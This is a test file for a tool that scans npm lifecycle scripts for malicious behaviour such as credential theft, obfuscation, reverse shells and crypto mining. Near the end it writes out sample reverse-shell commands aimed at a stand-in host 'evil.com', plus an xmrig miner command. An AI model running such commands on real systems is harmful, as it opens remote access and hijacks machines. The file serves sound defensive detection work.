import { describe, it, expect } from 'vitest';
import { analyzePackage, extractLifecycleScripts, calculateRiskScore, riskLevelFromScore } from '../src/scanners/lifecycle.js';
import { PATTERN_RULES } from '../src/scanners/patterns.js';
import * as fs from 'node:fs';
import * as path from 'node:path';

const FIXTURES = path.join(__dirname, 'fixtures');

function loadFixture(name: string) {
  return JSON.parse(fs.readFileSync(path.join(FIXTURES, name), 'utf-8'));
}

describe('extractLifecycleScripts', () => {
  it('extracts only lifecycle scripts from a full scripts object', () => {
    const scripts = {
      preinstall: 'echo pre',
      postinstall: 'echo post',
      build: 'tsc',
      test: 'vitest',
      prepare: 'echo prep',
    };
    const result = extractLifecycleScripts(scripts);
    expect(result).toHaveProperty('preinstall');
    expect(result).toHaveProperty('postinstall');
    expect(result).toHaveProperty('prepare');
    expect(result).not.toHaveProperty('build');
    expect(result).not.toHaveProperty('test');
  });

  it('returns empty object when no lifecycle scripts present', () => {
    const scripts = { build: 'tsc', test: 'vitest' };
    const result = extractLifecycleScripts(scripts);
    expect(Object.keys(result)).toHaveLength(0);
  });
});

describe('calculateRiskScore', () => {
  it('returns 0 for no findings', () => {
    expect(calculateRiskScore([])).toBe(0);
  });

  it('returns higher score for critical findings', () => {
    const critical = [{ riskLevel: 'critical' as const, package: 'x', scriptName: 'postinstall', scriptContent: '', pattern: 'test', description: '', match: '' }];
    const low = [{ riskLevel: 'low' as const, package: 'x', scriptName: 'postinstall', scriptContent: '', pattern: 'test', description: '', match: '' }];
    expect(calculateRiskScore(critical)).toBeGreaterThan(calculateRiskScore(low));
  });
});

describe('riskLevelFromScore', () => {
  it('returns correct levels for score ranges', () => {
    expect(riskLevelFromScore(0)).toBe('low');
    expect(riskLevelFromScore(20)).toBe('low');
    expect(riskLevelFromScore(30)).toBe('medium');
    expect(riskLevelFromScore(55)).toBe('high');
    expect(riskLevelFromScore(80)).toBe('critical');
  });
});

describe('analyzePackage — safe package', () => {
  it('finds no issues in a safe package', () => {
    const pkg = loadFixture('safe.json');
    const result = analyzePackage(pkg.name, pkg.version, pkg.scripts);
    expect(result.name).toBe('safe-pkg');
    expect(result.findings).toHaveLength(0);
    expect(result.riskScore).toBe(0);
    expect(result.riskLevel).toBe('low');
  });
});

describe('analyzePackage — malicious package', () => {
  it('detects curl pipe to bash', () => {
    const pkg = loadFixture('malicious.json');
    const result = analyzePackage(pkg.name, pkg.version, pkg.scripts);
    expect(result.findings.length).toBeGreaterThan(0);
    expect(result.riskLevel).toBe('critical');

    const curlFinding = result.findings.find(f => f.pattern === 'curl-pipe');
    expect(curlFinding).toBeDefined();
    expect(curlFinding!.riskLevel).toBe('critical');
  });

  it('detects environment variable access', () => {
    const pkg = loadFixture('malicious.json');
    const result = analyzePackage(pkg.name, pkg.version, pkg.scripts);
    const envFinding = result.findings.find(f => f.pattern === 'env-exfil');
    expect(envFinding).toBeDefined();
  });

  it('detects AWS credential access', () => {
    const pkg = loadFixture('malicious.json');
    const result = analyzePackage(pkg.name, pkg.version, pkg.scripts);
    const awsFinding = result.findings.find(f => f.pattern === 'aws-creds');
    expect(awsFinding).toBeDefined();
    expect(awsFinding!.riskLevel).toBe('critical');
  });
});

describe('analyzePackage — suspicious package', () => {
  it('detects /etc/passwd access', () => {
    const pkg = loadFixture('suspicious.json');
    const result = analyzePackage(pkg.name, pkg.version, pkg.scripts);
    const passwdFinding = result.findings.find(f => f.pattern === 'passwd-shadow');
    expect(passwdFinding).toBeDefined();
    expect(passwdFinding!.riskLevel).toBe('critical');
  });

  it('detects SSH key access', () => {
    const pkg = loadFixture('suspicious.json');
    const result = analyzePackage(pkg.name, pkg.version, pkg.scripts);
    const sshFinding = result.findings.find(f => f.pattern === 'ssh-access');
    expect(sshFinding).toBeDefined();
    expect(sshFinding!.riskLevel).toBe('critical');
  });

  it('detects child_process usage', () => {
    const pkg = loadFixture('suspicious.json');
    const result = analyzePackage(pkg.name, pkg.version, pkg.scripts);
    const execFinding = result.findings.find(f => f.pattern === 'child-process');
    expect(execFinding).toBeDefined();
  });
});

describe('analyzePackage — obfuscated package', () => {
  it('detects eval usage in shell context', () => {
    const pkg = loadFixture('obfuscated.json');
    const result = analyzePackage(pkg.name, pkg.version, pkg.scripts);
    const evalFinding = result.findings.find(f => f.pattern === 'eval-usage');
    expect(evalFinding).toBeDefined();
    expect(evalFinding!.riskLevel).toBe('high');
  });

  it('detects base64 decode + shell eval pattern', () => {
    const pkg = loadFixture('obfuscated.json');
    const result = analyzePackage(pkg.name, pkg.version, pkg.scripts);
    // The eval wrapping base64 decode triggers eval-usage; base64 -d is also detected
    expect(result.findings.some(f => f.pattern === 'eval-usage' || f.pattern === 'base64-exec')).toBe(true);
  });

  it('assigns high or critical risk to obfuscated packages', () => {
    const pkg = loadFixture('obfuscated.json');
    const result = analyzePackage(pkg.name, pkg.version, pkg.scripts);
    expect(result.findings.length).toBeGreaterThan(0);
    expect(['high', 'critical']).toContain(result.riskLevel);
  });
});

describe('PATTERN_RULES', () => {
  it('has rules covering all categories', () => {
    const categories = new Set(PATTERN_RULES.map(r => r.category));
    expect(categories.has('network')).toBe(true);
    expect(categories.has('execution')).toBe(true);
    expect(categories.has('filesystem')).toBe(true);
    expect(categories.has('exfiltration')).toBe(true);
    expect(categories.has('obfuscation')).toBe(true);
    expect(categories.has('crypto')).toBe(true);
  });

  it('has at least 20 rules', () => {
    expect(PATTERN_RULES.length).toBeGreaterThanOrEqual(20);
  });

  it('every rule has required fields', () => {
    for (const rule of PATTERN_RULES) {
      expect(rule.name).toBeTruthy();
      expect(rule.pattern).toBeInstanceOf(RegExp);
      expect(['low', 'medium', 'high', 'critical']).toContain(rule.riskLevel);
      expect(rule.description).toBeTruthy();
      expect(rule.category).toBeTruthy();
    }
  });

  it('detects reverse shell patterns', () => {
    const match = PATTERN_RULES.find(r => r.name === 'reverse-shell');
    expect(match).toBeDefined();
    expect(match!.pattern.test('nc -e /bin/bash evil.com 4444')).toBe(true);
    expect(match!.pattern.test('/dev/tcp/evil.com/4444')).toBe(true);
  });

  it('detects crypto mining patterns', () => {
    const match = PATTERN_RULES.find(r => r.name === 'crypto-miner');
    expect(match).toBeDefined();
    expect(match!.pattern.test('xmrig --url=stratum+tcp://pool.minexmr.com:443')).toBe(true);
  });
});
